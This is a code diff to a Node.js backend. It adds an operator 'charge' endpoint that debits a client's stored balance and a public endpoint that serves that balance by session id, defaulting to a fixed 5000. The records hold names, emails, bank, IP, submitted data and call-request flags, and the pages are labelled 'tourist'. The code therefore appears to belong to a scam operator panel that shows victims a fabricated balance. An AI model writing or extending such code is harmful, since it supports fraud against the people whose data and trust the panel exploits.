@@ -1491,7 +1491,7 @@ async function handleChatOpClients(req, reply) {
         id: true, flowSessionId: true, nombre: true, email: true, bank: true,
         ip: true, status: true, callerNote: true, submissionData: true,
         calledAt: true, createdAt: true, updatedAt: true,
-        callRequested: true, operatorCalled: true,
+        callRequested: true, operatorCalled: true, balance: true, transactions: true,
         events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
       },
     });
@@ -1664,6 +1664,56 @@ async function handleSupportChatMarkRead(req, reply) {
     });
     return reply.send({ ok: true });
   } catch { return reply.send({ ok: true }); }
+}
+
+// ── Charge (chat-op debits client balance) ────────────────────────────────────
+async function handleChatOpCharge(req, reply) {
+  if (!requireChatOp(req, reply)) return;
+  try {
+    const body = asRecord(req.body) ?? {};
+    const sessionId = sanitizeString(getString(body.sessionId), 80);
+    const amount = parseFloat(body.amount);
+    const description = sanitizeString(getString(body.description) || 'Списание', 200);
+    if (!sessionId || !isFinite(amount) || amount <= 0) {
+      return reply.status(400).send({ error: 'invalid_params' });
+    }
+    const wc = await prisma.webClient.findUnique({
+      where: { flowSessionId: sessionId },
+      select: { balance: true, transactions: true },
+    });
+    if (!wc) return reply.status(404).send({ error: 'not_found' });
+    const newBalance = Math.max(0, (wc.balance ?? 5000) - amount);
+    const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
+    txs.push({ id: randomUUID(), type: 'debit', amount, description, date: new Date().toISOString() });
+    await prisma.webClient.update({
+      where: { flowSessionId: sessionId },
+      data: { balance: newBalance, transactions: txs },
+    });
+    broadcastUpdate('clients_changed');
+    return reply.send({ ok: true, balance: newBalance });
+  } catch (err) {
+    console.error('[chat-op/charge]', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleGetClientBalance(req, reply) {
+  const sessionId = sanitizeString(req.params.sessionId || '', 80);
+  if (!sessionId) return reply.send({ balance: 5000, transactions: [] });
+  try {
+    const wc = await prisma.webClient.findUnique({
+      where: { flowSessionId: sessionId },
+      select: { balance: true, transactions: true },
+    });
+    if (!wc) return reply.send({ balance: 5000, transactions: [] });
+    return reply.send({
+      balance: wc.balance ?? 5000,
+      transactions: Array.isArray(wc.transactions) ? wc.transactions : [],
+    });
+  } catch (err) {
+    console.error('[tourist/balance]', err?.message || err);
+    return reply.send({ balance: 5000, transactions: [] });
+  }
 }
 
 // ── Push notifications ────────────────────────────────────────────────────────
@@ -1888,6 +1938,10 @@ export async function registerApiRoutes(app) {
   app.post('/api/chat-op/request-call', handleChatOpRequestCall);
   app.put('/api/chat-op/note', handleChatOpSaveNote);
   app.post('/api/chat-op/send-push', handleChatOpSendPush);
+  app.post('/api/chat-op/charge', handleChatOpCharge);
+
+  // Client balance (public — tourist pages)
+  app.get('/api/tourist/balance/:sessionId', handleGetClientBalance);
 
   // Image upload (client + operator)
   app.post('/api/upload-image', handleUploadImage);
